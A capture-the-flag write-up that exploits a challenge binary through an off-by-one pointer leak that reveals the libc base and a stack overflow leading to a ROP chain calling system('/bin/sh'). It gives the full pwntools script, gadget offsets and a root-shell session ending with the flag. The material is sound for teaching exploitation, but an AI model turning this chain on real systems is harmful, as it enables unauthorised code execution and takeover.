### Writeup
First, let's identify the vulnerable code paths. When reading in the name, there's a typo that makes us write 1 byte outside the name buffer boundary.

```C
if (read(STDIN_FILENO, user.name, sizeof(user.name) + 1) <= 0) {
	perror("read()");
	exit(EXIT_FAILURE);
}
```

Taking a closer look at the `struct user`, we see that this makes it possible to leak the `buf` pointer:

```C
struct user {
	char name[256];
	char *buf;
};
```

While this may not look too useful at first, the `mmap`ed buffer will always be located at the same offset from `libc`, so we got ourselves a nice leak! Let's test it:

```python2
from pwn import *
import binascii

p = process("./lol")
p.recvuntil("Enter name: ")
p.send("A" * 257)
tmp = p.recvuntil("!")

addr = tmp[265:]
addr = addr[:6].ljust(8, "\x00")
addr = u64(addr)
addr -= 0x41 # hex value of 'A'

libc_base = addr - 0x5c8000
log.info("address: {}".format(hex(addr)))
log.info("libc base: {}".format(hex(libc_base)))
```

With this particular setup, the offset from the mmap buffer and libc is `0x5c8000`. **TODO:** show how to figure this out (for now, check out [off.c](src/off.c)).


Running the script a few times, we can see that it works:


```
$ python2 lol.py 
[+] Started program './lol'
[*] address: 0x7f3541061000
[*] libc base: 0x7f3540a99000
[*] Stopped program './lol'
$ python2 lol.py
[+] Started program './lol'
[*] address: 0x7fc06d84b000
[*] libc base: 0x7fc06d283000
[*] Stopped program './lol'
```


Now for the second part of the vulnerability:

```C
ssize_t ret = read(STDIN_FILENO, buf, len);
```

`buf` is only 128 bytes large, but `len` is set to 4096.


`buf` is located at `rbp-0x90`, so write the correct amount of padding to control `rip`.
```
0x000000000040076c <+70>:	lea    rax,[rbp-0x90]
0x0000000000400773 <+77>:	mov    rsi,rax
0x0000000000400776 <+80>:	mov    edi,0x0
0x000000000040077b <+85>:	call   0x4005d0 <read@plt>
```

Add this to the script:
```python2
pad = "A" * 152
p.sendline(pad + "CCCCCCCC")

p.interactive()
```

```
$ python2 lol.py
[+] Started program './lol'
[*] address: 0x7f15f852e000
[*] libc base: 0x7f15f7f66000
[*] Switching to interactive mode

Enter a message: [*] Program './lol' stopped with exit code -11
[*] Got EOF while reading in interactive

$ gdb ./lol 32641.core 
Core was generated by `./lol'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00000000004007c5 in read_user_input ()
gdb-peda$ x/i $rip
=> 0x4007c5 <read_user_input+159>:	ret    
gdb-peda$ x/2xw $rsp
0x7fff39727948:	0x43434343	0x43434343
```

We now have full control over `rip`! Time to find some gadgets.


```
$ ROPgadget --binary libc-2.19.so > gadgets
$ cat gadgets|grep ": pop rdi ; ret"
0x0000000000022482 : pop rdi ; ret
$ strings -t x libc-2.19.so|grep /bin/sh
 163b00 /bin/sh
$ nm -D libc-2.19.so|grep system
0000000000041570 T __libc_system
0000000000114340 T svcerr_systemerr
0000000000041570 W system
```

This should be enough to set up our ROP chain to call `system("/bin/sh");`. Full script:

```python2
from pwn import *
import binascii

p = remote("127.0.0.1", 7777)
p.recvuntil("Enter name: ")
p.send("A" * 257)
tmp = p.recvuntil("!")

addr = tmp[265:]
addr = addr[:6].ljust(8, "\x00")
addr = u64(addr)
addr -= 0x41 # hex value of 'A'

libc_base = addr - 0x5c8000
log.info("address: {}".format(hex(addr)))
log.info("libc base: {}".format(hex(libc_base)))

pop_rdi = libc_base + 0x22482
bin_sh = libc_base + 0x163b00
system_addr = libc_base + 0x41570

rop_chain = p64(pop_rdi)
rop_chain += p64(bin_sh)
rop_chain += p64(system_addr)

pad = "A" * 152
p.sendline(pad + rop_chain)

p.interactive()
```

Let's run it!
```
python2 lol.py
[+] Opening connection to 127.0.0.1 on port 7777: Done
[*] address: 0x7f7011b5f000
[*] libc base: 0x7f7011597000
[*] Switching to interactive mode

Enter a message: $ id
uid=0(root) gid=0(root) groups=0(root)
$ find / -name flag
$ find / -name flag*
/proc/sys/kernel/sched_domain/cpu0/domain0/flags
/proc/sys/kernel/sched_domain/cpu0/domain1/flags
/proc/sys/kernel/sched_domain/cpu1/domain0/flags
/proc/sys/kernel/sched_domain/cpu1/domain1/flags
/proc/sys/kernel/sched_domain/cpu2/domain0/flags
/proc/sys/kernel/sched_domain/cpu2/domain1/flags
/proc/sys/kernel/sched_domain/cpu3/domain0/flags
/proc/sys/kernel/sched_domain/cpu3/domain1/flags
/root/flag.txt
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/platform/serial8250/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
$ cat /root/flag.txt
TG16{ROP_master-3000_destr0yer_of_libC}
````
